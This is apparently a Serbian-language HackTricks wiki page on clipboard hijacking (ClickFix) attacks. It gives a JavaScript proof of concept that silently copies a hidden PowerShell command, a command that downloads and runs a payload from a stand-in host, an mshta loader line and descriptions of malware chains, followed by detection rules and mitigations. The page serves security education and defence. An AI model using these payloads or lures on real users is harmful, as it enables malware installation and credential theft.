# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nikada ne lepite ništa što niste sami kopirali." – stara, ali još uvek važeća preporuka

## Overview

Clipboard hijacking – takođe poznat kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju i lepe komande bez da ih pregledaju. Zlonamerna veb stranica (ili bilo koji kontekst sposoban za JavaScript, kao što su Electron ili Desktop aplikacije) programatski postavlja tekst pod kontrolom napadača u sistemski clipboard. Žrtve su podstaknute, obično pažljivo osmišljenim uputstvima za socijalno inženjerstvo, da pritisnu **Win + R** (Run dijalog), **Win + X** (Brzi pristup / PowerShell), ili da otvore terminal i *lepe* sadržaj clipboard-a, odmah izvršavajući proizvoljne komande.

Zato što **nema preuzimanja datoteka i nema otvaranja priloga**, tehnika zaobilazi većinu e-mail i web-sadržajnih bezbednosnih kontrola koje prate priloge, makroe ili direktno izvršavanje komandi. Napad je stoga popularan u phishing kampanjama koje isporučuju komercijalne porodice malvera kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje su koristile `document.execCommand('copy')`, dok se novije oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake Tok

1. Korisnik posećuje sajt sa greškom u imenu ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Umetnuti **ClearFake** JavaScript poziva `unsecuredCopyToClipboard()` pomoćnu funkciju koja tiho čuva Base64-enkodiranu PowerShell jedinstvenu komandu u clipboard-u.
3. HTML uputstva govore žrtvi da: *“Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da biste rešili problem.”*
4. `powershell.exe` se izvršava, preuzimajući arhivu koja sadrži legitimnu izvršnu datoteku plus zloćudni DLL (klasično DLL sideloading).
5. Loader dekriptuje dodatne faze, umetne shellcode i instalira postojanost (npr. zakazani zadatak) – na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.

### Primer NetSupport RAT Lanca
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimni Java WebStart) pretražuje svoj direktorijum za `msvcp140.dll`.
* Maliciozni DLL dinamički rešava API-je sa **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) putem **curl.exe**, dekriptuje ih koristeći rolling XOR ključ `"https://google.com/"`, injektuje konačni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` pomoću **curl.exe**
2. Izvršava JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → postavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer putem MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** poziv pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, ekstrahuje `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` putem `extrac32` i spajanja fajlova, i na kraju pokreće `.a3x` skript koji exfiltrira kredencijale pretraživača na `sumeriavgv.digital`.

## Detekcija i Lov

Plave ekipe mogu kombinovati telemetriju clipboard-a, kreiranja procesa i registra kako bi precizno odredile zloupotrebu pastejacking-a:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – tražite neobične Base64 / obfuskovane unose.
* ID sigurnosnog događaja **4688** (Kreiranje procesa) gde je `ParentImage` == `explorer.exe` i `NewProcessName` u { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Događaj ID **4663** za kreiranje fajlova pod `%LocalAppData%\Microsoft\Windows\WinX\` ili privremenim folderima neposredno pre sumnjivog 4688 događaja.
* EDR senzori clipboard-a (ako su prisutni) – korelacija `Clipboard Write` odmah nakon novog PowerShell procesa.

## Mogućnosti ublažavanja

1. Ojačavanje pretraživača – onemogućiti pristup pisanju u clipboard (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevati korisnički gest.
2. Bezbednosna svest – podučiti korisnike da *kucaju* osetljive komande ili ih prvo nalepite u tekst editor.
3. PowerShell Constrained Language Mode / Execution Policy + Kontrola aplikacija za blokiranje proizvoljnih jedne-linijskih komandi.
4. Mrežne kontrole – blokirati odlazne zahteve ka poznatim pastejacking i malware C2 domenima.

## Povezani trikovi

* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix pristup nakon što namami korisnike u zloćudni server:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Reference

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
